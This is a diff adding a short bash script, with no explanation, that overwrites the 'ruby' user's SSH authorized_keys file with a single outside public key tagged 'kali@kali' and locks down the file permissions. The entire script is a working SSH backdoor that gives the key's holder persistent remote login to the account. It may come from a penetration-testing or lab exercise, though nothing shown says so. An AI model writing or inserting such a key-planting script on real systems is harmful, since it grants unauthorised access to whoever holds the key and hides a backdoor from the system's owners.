@@ -1,0 +1,5 @@
+#!/bin/bash
+mkdir -p /home/ruby/.ssh
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8f8EJI0S6+lzks5vzkbCobNSgW3ZDpzsK+TJgfPXp9xq+uHpQJzNzul+Zsiu9kFFeJx0lYEWxUKpWL1pfKJ4Q8a36uft1GYI832kgwOrq86IhIylincKyvQT6yd1mTUrL7eEru9kBfc6nMbl/NTGJDoRELzuLXIcx7PmfS1rQyZnkCYuVEKWHI8buhpSyv4bMV2+zir4FX5MHm4js0Glu1c2uCdWKW4l18qxtr1PXXtO/NikJOVw45Gp6z8beTz4RBM7Ptc97Kl6N/BwmYKiH1dbtn2Ov+F2eOX5TbFdlTtrdPUWeJqy7blhyCEvfCCtGSXbzqRAHSOKHn2Xn0XMcaglsqgy26VR2b7T4cc9EbIVyT3K+nn2a2PDz5VqE0l4Oy0BTBfQPSHGc6VndieSPDkdcSHMGsLEJJHUFiGtzjAdRLTn5SOO4d/zSquBfqlt+xPFWG6ymxTiLa8qgxTcK4yrXObFE6Dq1196udHjFkFDhCa8CSZ4/gJGZjUtAUac= kali@kali' > /home/ruby/.ssh/authorized_keys
+chmod 700 /home/ruby/.ssh
+chmod 600 /home/ruby/.ssh/authorized_keys
